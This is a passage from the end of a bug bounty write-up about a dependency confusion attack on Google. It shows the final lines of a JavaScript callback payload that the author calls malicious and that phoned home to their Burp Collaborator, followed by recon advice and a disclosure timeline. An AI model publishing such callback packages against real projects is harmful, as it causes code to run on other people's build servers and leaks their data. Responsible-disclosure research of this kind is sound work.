</span></span><span style=display:flex><span>    <span style=color:#75715e>// console.error(e);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>req<span style=color:#f92672>.</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>postData<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>req<span style=color:#f92672>.</span><span style=color:#a6e22e>end</span><span style=color:#f92672>();</span>
</span></span></code></pre></div><p>In this malicious code above I put my burp collaborater in order to receive the callback if the code is being executed on the server. I waited, waited and waited. Callback hasn&rsquo;t came until 5 hours. I decided to wait 1 more hour and then just shutdown my whole plan. After around 33 minutes , I recieved a callback to my burp collaborater.</p><img src=https://user-images.githubusercontent.com/8293321/135176099-0e3fa01c-bdce-4f04-a94f-de0a34c7abf6.png alt="Hello Friend" class=center style=border-radius:8px><p>This was something I never expected that happened now. I just left my system and gone out. After coming back I quickly reported to Google Vrp. Within 15 minutes my report got Triaged and Accepted.</p><h2 id=why-it-is-considered-as-a-deep-gold-mine>Why it is considered as a Deep Gold Mine?
<a href=#why-it-is-considered-as-a-deep-gold-mine class=h-anchor aria-hidden=true>#</a></h2><p>Yeah by this , everyone will believe that it is a gold mine and look for same type of bugs. But there&rsquo;s a catch, The way you recon means a lot. If your recon is weak then you would never be able to find this in the near time. Your recon should be accessible to all the endpoints withing the program and as well as using third party platforms - Github, Shodan , Google Dorks etc. The attack Dependency Confusion is still not very overrated but I want to disclose as this was a bit that I got from the community and here is what I returned.</p><img src=https://64.media.tumblr.com/a76def644cc0b31881be79547604ee33/2c3aa8307bc296b3-e1/s540x810/4dedfb1c6a23bf52ae91154e79971567718ffbc4.png alt="Hello Friend" class=center style=border-radius:8px><h2 id=timeline>Timeline:
<a href=#timeline class=h-anchor aria-hidden=true>#</a></h2><p>[Dec 24, 2021] - Bug reported</p><p>[Dec 24, 2021] - Initial triage</p><p>[Dec 24, 2021] - Bug accepted (P4 -> P1)</p><p>[Jan 02, 2022] - Bug mitigated by temporarily disabling the Moments feature</p><p>[Jan 14, 2022] - Reward of $XXXX issued</p></div></div></div><footer class=footer><div class=footer__inner><a href=https://home.0xdroopy.live class=logo style=text-decoration:none><span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span><span class=logo__text>root@0xdroopy</span>
<span class=logo__cursor></span></a><div class=copyright><span>¬© 2022 Powered by
<a href=https://gohugo.io target=_blank rel=noopener>Hugo</a></span>
<span>Theme created by
<a href=https://twitter.com/panr target=_blank rel=noopener>panr</a></span></div></div></footer><script src=https://bugs.0xdroopy.live/assets/main.js></script>
<script src=https://bugs.0xdroopy.live/assets/prism.js></script></div></body></html>